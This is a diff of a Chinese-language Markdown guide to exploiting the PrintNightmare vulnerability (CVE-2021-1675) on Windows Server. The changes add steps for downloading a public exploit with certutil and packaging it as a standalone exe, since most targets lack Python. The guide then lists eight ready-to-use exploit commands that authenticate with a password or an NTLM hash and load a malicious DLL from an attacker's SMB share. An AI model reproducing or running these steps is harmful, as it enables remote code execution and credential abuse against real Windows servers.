@@ -18,11 +18,15 @@ tags:
 
 ### 注意事项
 
-#### 1.目标机器为域内Windows Server机器时，攻击机必须为同一域内的机器；目标机器为非域环境Windows Server机器时，攻击机器为目标机器可以访问到的另一机器即可
+#### 1.域相关
+
+目标机器为域内Windows Server机器时，攻击机必须为同一域内的机器；目标机器为非域环境Windows Server机器时，攻击机器为目标机器可以访问到的另一机器即可
 
 > 加入域后的Windows系统访问外部资源会携带已登录的域用户凭证，所以未加入域且未提前指定凭据的的SMB就无法访问。因此攻击域内机器有此限制
 
-#### 2.攻击机器为Windows Server 2019及更高版本时，需要执行 `Enable-WindowsOptionalFeature -Online -FeatureName smb1protocol`并重启去开启SMBv1，否则有可能出现rpc_s_access_denied的问题，攻击机器为2016及更低版本的系统时，可以直接使用 `Set-SmbServerConfiguration -EnableSMB1Protocol $true`开启SMBv1的支持
+#### 2.SMBv1
+
+攻击机器为Windows Server 2019及更高版本时，需要执行 `Enable-WindowsOptionalFeature -Online -FeatureName smb1protocol`并重启去开启SMBv1，否则有可能出现rpc_s_access_denied的问题，攻击机器为2016及更低版本的系统时，可以直接使用 `Set-SmbServerConfiguration -EnableSMB1Protocol $true`开启SMBv1的支持
 
 ## 步骤
 
@@ -66,42 +70,44 @@ CMD.EXE /C "del gp.sdb"
 
 ### 3.准备exp
 
+#### 选择exp
+
 推荐exp为[CVE-2021-1675.py](https://github.com/cube0x0/CVE-2021-1675/blob/main/CVE-2021-1675.py)，主要优势在于可以使用hash进行攻击，现在越来越难搞到密码了，hash的场景更多
 
+因为大部分目标环境不会有python环境，所以最好打包为exe使用
+
+#### 打包exe
+
+打包使用Windows 7机器，安装[Python3.8](https://www.python.org/ftp/python/3.8.10/python-3.8.10-amd64.exe)，[Git](https://github.com/git-for-windows/git/releases/download/v2.38.1.windows.1/Git-2.38.1-64-bit.exe)，之后执行以下命令
+
 ```bash
-pip3 uninstall impacket
 git clone https://github.com/cube0x0/impacket
 cd impacket
-python3 ./setup.py install
-pip3 install six pycryptodomex pyasn1
-```
-
-如果目标机器不存在python环境，可以在自己机器执行上诉命令，再打包成exe使用
-
-```bash
-pip3 install pyinstaller
+certutil -urlcache -split -f https://raw.githubusercontent.com/cube0x0/CVE-2021-1675/main/CVE-2021-1675.py CVE-2021-1675.py
+pip3 install six pycryptodomex pyasn1 pyinstaller
 pyinstaller --clean --onefile CVE-2021-1675.py
 ```
+
+生成的文件在`\impacket\dist\CVE-2021-1675.exe`
 
 ### 4.执行
 
 示例：
 
-
 ```bash
-CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 "\\192.168.1.215\share\addCube.dll"
+CVE-2021-1675.exe hackit.local/domain_user:Pass123@192.168.1.10 "\\192.168.1.215\share\addCube.dll"
 
-CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 "\\192.168.1.215\share\addCube.dll" "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL"
+CVE-2021-1675.exe hackit.local/domain_user:Pass123@192.168.1.10 "\\192.168.1.215\share\addCube.dll" "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL"
 
-CVE-2021-1675.py hackit.local/domain_user@192.168.1.10 -hashes :f0cff78ea8d2d87e5d1caccf01d0bd2f "\\192.168.1.215\share\addCube.dll"
+CVE-2021-1675.exe hackit.local/domain_user@192.168.1.10 -hashes :f0cff78ea8d2d87e5d1caccf01d0bd2f "\\192.168.1.215\share\addCube.dll"
 
-CVE-2021-1675.py hackit.local/domain_user@192.168.1.10 -hashes :f0cff78ea8d2d87e5d1caccf01d0bd2f "\\192.168.1.215\share\addCube.dll" "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL"
+CVE-2021-1675.exe hackit.local/domain_user@192.168.1.10 -hashes :f0cff78ea8d2d87e5d1caccf01d0bd2f "\\192.168.1.215\share\addCube.dll" "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL"
 
-CVE-2021-1675.py domain_user:Pass123@192.168.1.10 "\\192.168.1.215\share\addCube.dll"
+CVE-2021-1675.exe domain_user:Pass123@192.168.1.10 "\\192.168.1.215\share\addCube.dll"
 
-CVE-2021-1675.py domain_user:Pass123@192.168.1.10 "\\192.168.1.215\share\addCube.dll" "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL"
+CVE-2021-1675.exe domain_user:Pass123@192.168.1.10 "\\192.168.1.215\share\addCube.dll" "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL"
 
-CVE-2021-1675.py domain_user@192.168.1.10 -hashes :f0cff78ea8d2d87e5d1caccf01d0bd2f "\\192.168.1.215\share\addCube.dll"
+CVE-2021-1675.exe domain_user@192.168.1.10 -hashes :f0cff78ea8d2d87e5d1caccf01d0bd2f "\\192.168.1.215\share\addCube.dll"
 
-CVE-2021-1675.py domain_user@192.168.1.10 -hashes :f0cff78ea8d2d87e5d1caccf01d0bd2f "\\192.168.1.215\share\addCube.dll" "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL"
+CVE-2021-1675.exe domain_user@192.168.1.10 -hashes :f0cff78ea8d2d87e5d1caccf01d0bd2f "\\192.168.1.215\share\addCube.dll" "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL"
 ```
